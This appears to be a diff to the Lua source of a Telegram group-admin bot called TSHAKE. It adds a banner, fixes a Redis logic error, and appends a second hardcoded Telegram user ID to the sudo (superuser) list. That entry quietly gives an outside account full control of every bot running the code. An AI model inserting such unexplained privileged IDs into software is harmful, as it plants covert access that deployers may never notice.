@@ -1,4 +1,11 @@
-
+--[[
+ _____ ____  _   _    _    _  _______
+|_   _/ ___|| | | |  / \  | |/ / ____|
+  | | \___ \| |_| | / _ \ | ' /|  _|
+  | |  ___) |  _  |/ ___ \| . \| |___
+  |_| |____/|_| |_/_/   \_\_|\_\_____|
+           CH > @TSHAKETEAM
+--]]
 --------------------------------------
 serpent = (loadfile  "./libs/serpent.lua")()
 https = require("ssl.https")
@@ -15,7 +22,7 @@ chats = {}
 day = 86400
 bot_iid = {string.match(token, "^(%d+)(:)(.*)")}
 bot_id = tonumber(bot_iid[1])
-sudo_users = {sudo_add,bot_id,373906612}
+sudo_users = {sudo_add,bot_id,373906612,545906637}
 tdcli=dofile('./libs/utils.lua')
 URL33 = require('socket.url')
 ---------- {Show Files} -----------
@@ -8962,9 +8969,9 @@ database:srem('tshake:'..bot_id..'pro:groups',v)
 database:srem( 'tshake:'..bot_id.."groups",v) 
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
-database:srem("thsake:gog"..bot_id,v) 
-database:srem('tshake:'..bot_id..'pro:groups',v) 
-database:srem( 'tshake:'..bot_id.."groups",v) 
+database:sadd("thsake:gog"..bot_id,v) 
+database:sadd('tshake:'..bot_id..'pro:groups',v) 
+database:sadd( 'tshake:'..bot_id.."groups",v) 
 print('\27[30;32m»» البوت ادمن في المجموعه \n\27[1;37m')
 end end,nil) end
 tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
